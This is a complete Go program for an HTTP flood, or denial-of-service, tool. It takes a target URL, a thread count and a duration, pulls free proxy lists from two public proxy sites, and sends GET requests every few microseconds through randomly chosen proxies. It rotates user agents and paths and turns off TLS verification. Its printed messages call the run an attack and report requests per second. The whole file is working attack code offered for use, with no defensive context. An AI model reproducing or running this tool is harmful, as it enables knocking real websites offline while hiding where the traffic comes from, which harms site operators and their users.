package main

import (
    "crypto/tls"
    "flag"
    "fmt"
    "io/ioutil"
    "log"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    targetURL   string
    duration    int
    threads     int
    proxies     []string
    clientPool  sync.Pool
    requestCount uint64
    peakRPS     uint64
    acceptList  = []string{
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
    }
    userAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    }
    proxySources = []string{
        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
        "https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt",
    }
)

func init() {
    flag.StringVar(&targetURL, "url", "", "Target URL")
    flag.IntVar(&duration, "time", 0, "Duration in seconds")
    flag.IntVar(&threads, "threads", 1, "Number of threads")
    flag.Parse()

    if targetURL == "" || duration == 0 {
        fmt.Println("Usage: go run main.go -url [target] -time [seconds] -threads [count]")
        os.Exit(1)
    }

    // Initialize client pool
    clientPool.New = func() interface{} {
        return &http.Client{
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{
                    MinVersion:         tls.VersionTLS13,
                    MaxVersion:         tls.VersionTLS13,
                    Ciphersuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
                    CurvePreferences:   []tls.CurveID{tls.X25519},
                    InsecureSkipVerify: true,
                },
                MaxIdleConns:        10000,
                MaxIdleConnsPerHost: 1000,
                IdleConnTimeout:     90 * time.Second,
                DialContext: (&net.Dialer{
                    Timeout:   5 * time.Second,
                    KeepAlive: 30 * time.Second,
                }).DialContext,
            },
            Timeout: 5 * time.Second,
        }
    }

    // Fetch proxies
    fetchProxies()
}

func fetchProxies() {
    client := &http.Client{Timeout: 10 * time.Second}
    var allProxies []string

    for _, source := range proxySources {
        resp, err := client.Get(source)
        if err != nil {
            log.Printf("Warning: Failed to fetch proxies from %s: %v", source, err)
            continue
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Printf("Warning: Failed to read proxy response from %s: %v", source, err)
            continue
        }

        proxies := strings.Split(string(body), "\n")
        for i := range proxies {
            proxy := strings.TrimSpace(proxies[i])
            if proxy != "" {
                allProxies = append(allProxies, proxy)
            }
        }
    }

    if len(allProxies) == 0 {
        log.Fatal("No proxies available")
    }

    proxies = allProxies
    fmt.Printf("Loaded %d proxies\n", len(proxies))
}

func randomString(slice []string) string {
    return slice[rand.Intn(len(slice))]
}

func randomPath() string {
    paths := []string{"/", "/home", "/api", "/data"}
    return paths[rand.Intn(len(paths))]
}

func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
    defer wg.Done()
    
    target, _ := url.Parse(targetURL)
    client := clientPool.Get().(*http.Client)
    defer clientPool.Put(client)

    for {
        select {
        case <-stopChan:
            return
        default:
            proxy := proxies[rand.Intn(len(proxies))]
            proxyURL, _ := url.Parse("http://" + proxy)
            client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)

            req, _ := http.NewRequest(
                "GET",
                targetURL+randomPath(),
                nil,
            )

            req.Header.Set("Accept", randomString(acceptList))
            req.Header.Set("User-Agent", randomString(userAgents))
            req.Header.Set("Accept-Encoding", "gzip, deflate, br")
            req.Header.Set("Connection", "keep-alive")

            atomic.AddUint64(&requestCount, 1)
            go client.Do(req)
            time.Sleep(time.Microsecond * 10)
        }
    }
}

func monitorStats(stopChan chan struct{}) {
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    var lastCount uint64

    for {
        select {
        case <-stopChan:
            return
        case <-ticker.C:
            current := atomic.LoadUint64(&requestCount)
            rps := current - lastCount
            if rps > peakRPS {
                atomic.StoreUint64(&peakRPS, rps)
            }
            lastCount = current
            fmt.Printf("Current RPS: %d\n", rps)
        }
    }
}

func main() {
    rand.Seed(time.Now().UnixNano())
    stopChan := make(chan struct{})
    var wg sync.WaitGroup

    fmt.Printf("Starting attack on %s with %d threads for %d seconds\n", targetURL, threads, duration)

    // Start stats monitoring
    go monitorStats(stopChan)

    // Start attack threads
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go attack(&wg, stopChan)
    }

    // Wait for duration
    time.Sleep(time.Duration(duration) * time.Second)
    close(stopChan)
    wg.Wait()

    // Calculate and display statistics
    total := atomic.LoadUint64(&requestCount)
    avgRPS := float64(total) / float64(duration)
    peak := atomic.LoadUint64(&peakRPS)

    fmt.Printf("\nAttack completed\n")
    fmt.Printf("Total Requests: %d\n", total)
    fmt.Printf("Average RPS: %.2f\n", avgRPS)
    fmt.Printf("Peak RPS: %d\n", peak)
}
